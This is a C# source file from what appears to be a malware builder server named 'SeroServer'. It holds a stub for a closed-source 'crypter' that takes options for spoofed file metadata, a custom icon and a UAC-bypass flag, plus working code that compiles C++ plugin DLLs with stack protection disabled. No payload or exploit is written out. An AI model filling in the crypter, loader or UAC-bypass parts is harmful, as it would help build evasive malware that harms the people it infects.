// STUB - replace with real Crypter.cs locally (see README)
// After replacing: git update-index --assume-unchanged server/Builder/Crypter.cs

using System.IO;

namespace SeroServer.Builder;

public record LoaderMetadata(
    string? ProductName,
    string? CompanyName,
    string? FileVersion,
    string? ProductVersion,
    string? FileDescription,
    string? Copyright);

public static class CrypterBuilder
{
    public static Task ApplyAsync(
        string exePath,
        Action<string> log,
        string? iconPath = null,
        LoaderMetadata? metadata = null,
        bool uacBypass = false)
    {
        log("[!] Crypter: not available (closed-source). Replace server/Builder/Crypter.cs.");
        return Task.CompletedTask;
    }

    public static async Task<byte[]?> CompilePluginDllAsync(
        string cppSource,
        string? extraLibs,
        Action<string> log)
    {
        string? clPath = FindClExe(log);
        if (clPath == null) return null;

        var tempDir = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
        Directory.CreateDirectory(tempDir);
        var srcPath = Path.Combine(tempDir, "plugin.cpp");
        var dllPath = Path.Combine(tempDir, "plugin.dll");
        try
        {
            await File.WriteAllTextAsync(srcPath, cppSource);
            extraLibs ??= "kernel32.lib";
            var objPath = Path.Combine(tempDir, "plugin.obj");
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName               = clPath,
                // Use explicit .obj path instead of /Fo"dir\" — trailing backslash before closing
                // quote causes cmd to merge the lib arguments into the /Fo path (C1083 error).
                Arguments              = $"\"{srcPath}\" /LD /O2 /GS- /MT /W0 /nologo /Fe\"{dllPath}\" /Fo\"{objPath}\" {extraLibs} /link /INCREMENTAL:NO /OPT:REF /OPT:ICF",
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true,
            };
            var vsEnv = GetVsEnvironment();
            if (vsEnv != null) foreach (var kv in vsEnv) psi.Environment[kv.Key] = kv.Value;
            using var proc = System.Diagnostics.Process.Start(psi)!;
            var stdout = await proc.StandardOutput.ReadToEndAsync();
            var stderr = await proc.StandardError.ReadToEndAsync();
            await proc.WaitForExitAsync();
            if (proc.ExitCode != 0)
            {
                log($"[!] Plugin compile failed (exit {proc.ExitCode})");
                // MSVC outputs errors to stdout, not stderr
                if (!string.IsNullOrWhiteSpace(stdout)) log(stdout.TrimEnd());
                if (!string.IsNullOrWhiteSpace(stderr)) log(stderr.TrimEnd());
                return null;
            }
            if (!File.Exists(dllPath)) { log("[!] Plugin DLL not found."); return null; }
            var bytes = await File.ReadAllBytesAsync(dllPath);
            log($"[+] Plugin compiled ({bytes.Length / 1024.0:F0} KB)");
            return bytes;
        }
        catch (Exception ex) { log($"[!] Plugin compile error: {ex.Message}"); return null; }
        finally { try { Directory.Delete(tempDir, true); } catch { } }
    }

    // Glob for cl.exe under a VS root directory (searches Hostx64\x64 and Hostx86\x64 sub-paths)
    private static string? GlobClExe(string vsRoot)
    {
        try
        {
            var msvc = Path.Combine(vsRoot, "VC", "Tools", "MSVC");
            if (!Directory.Exists(msvc)) return null;
            foreach (var ver in Directory.GetDirectories(msvc).OrderByDescending(d => d))
            {
                var cl = Path.Combine(ver, "bin", "Hostx64", "x64", "cl.exe");
                if (File.Exists(cl)) return cl;
                cl = Path.Combine(ver, "bin", "Hostx86", "x64", "cl.exe");
                if (File.Exists(cl)) return cl;
            }
        }
        catch { }
        return null;
    }

    private static string? FindClExe(Action<string>? log = null)
    {
        // 1. Try vswhere with -all flag to find any VS version including Insiders/Preview
        var vswhere = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
            "Microsoft Visual Studio", "Installer", "vswhere.exe");
        if (File.Exists(vswhere))
        {
            foreach (var vswhereArgs in new[]
            {
                @"-latest -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -find VC\Tools\MSVC\**\bin\Hostx64\x64\cl.exe",
                @"-latest -prerelease -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -find VC\Tools\MSVC\**\bin\Hostx64\x64\cl.exe",
                @"-all -find VC\Tools\MSVC\**\bin\Hostx64\x64\cl.exe",
            })
            {
                try
                {
                    var psi = new System.Diagnostics.ProcessStartInfo(vswhere, vswhereArgs)
                        { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                    using var p = System.Diagnostics.Process.Start(psi)!;
                    string? line;
                    while ((line = p.StandardOutput.ReadLine()?.Trim()) != null)
                    {
                        p.WaitForExit(5000);
                        if (!string.IsNullOrEmpty(line) && File.Exists(line)) return line;
                    }
                }
                catch { }
            }
        }

        // 2. Glob common VS root directories (supports VS 17/2022, VS 18/Insiders, Build Tools)
        var programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
        var programFilesX86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
        var vsRoots = new List<string>();
        foreach (var pf in new[] { programFiles, programFilesX86 })
        {
            var vsBase = Path.Combine(pf, "Microsoft Visual Studio");
            if (!Directory.Exists(vsBase)) continue;
            foreach (var verDir in Directory.GetDirectories(vsBase).OrderByDescending(d => d))
                foreach (var edDir in Directory.GetDirectories(verDir).OrderByDescending(d => d))
                    vsRoots.Add(edDir);
        }
        foreach (var root in vsRoots)
        {
            var cl = GlobClExe(root);
            if (cl != null) return cl;
        }

        // 3. Check PATH
        try
        {
            var psi2 = new System.Diagnostics.ProcessStartInfo("where", "cl.exe")
                { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
            using var p2 = System.Diagnostics.Process.Start(psi2)!;
            var line2 = p2.StandardOutput.ReadLine()?.Trim();
            p2.WaitForExit(3000);
            if (!string.IsNullOrEmpty(line2) && File.Exists(line2)) return line2;
        }
        catch { }
        log?.Invoke("[!] cl.exe not found. Install VS 2022/2025 with C++ Desktop workload.");
        return null;
    }

    private static string? FindVsInstallPath()
    {
        // Try vswhere first (with prerelease flag for Insiders)
        var vswhere = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
            "Microsoft Visual Studio", "Installer", "vswhere.exe");
        if (File.Exists(vswhere))
        {
            foreach (var args in new[]
            {
                "-latest -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath",
                "-latest -prerelease -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath",
                "-latest -prerelease -property installationPath",
            })
            {
                try
                {
                    var psi = new System.Diagnostics.ProcessStartInfo(vswhere, args)
                        { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                    using var p = System.Diagnostics.Process.Start(psi)!;
                    var path = p.StandardOutput.ReadLine()?.Trim();
                    p.WaitForExit(5000);
                    if (!string.IsNullOrEmpty(path) && File.Exists(Path.Combine(path, "VC", "Auxiliary", "Build", "vcvars64.bat")))
                        return path;
                }
                catch { }
            }
        }

        // Glob fallback — find any vcvars64.bat
        foreach (var pf in new[] { Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                                    Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) })
        {
            var vsBase = Path.Combine(pf, "Microsoft Visual Studio");
            if (!Directory.Exists(vsBase)) continue;
            foreach (var verDir in Directory.GetDirectories(vsBase).OrderByDescending(d => d))
                foreach (var edDir in Directory.GetDirectories(verDir).OrderByDescending(d => d))
                {
                    var vcvars = Path.Combine(edDir, "VC", "Auxiliary", "Build", "vcvars64.bat");
                    if (File.Exists(vcvars)) return edDir;
                }
        }
        return null;
    }

    private static Dictionary<string, string>? GetVsEnvironment()
    {
        try
        {
            var vsPath = FindVsInstallPath();
            if (string.IsNullOrEmpty(vsPath)) return null;
            var vcvars = Path.Combine(vsPath, "VC", "Auxiliary", "Build", "vcvars64.bat");
            if (!File.Exists(vcvars)) return null;
            var psi2 = new System.Diagnostics.ProcessStartInfo("cmd.exe", $"/c \"{vcvars}\" >nul 2>&1 && set")
                { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
            using var p2 = System.Diagnostics.Process.Start(psi2)!;
            var env = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            string? envLine;
            while ((envLine = p2.StandardOutput.ReadLine()) != null)
            { var idx = envLine.IndexOf('='); if (idx > 0) env[envLine[..idx]] = envLine[(idx + 1)..]; }
            p2.WaitForExit(10000);
            return env.Count > 0 ? env : null;
        }
        catch { return null; }
    }
}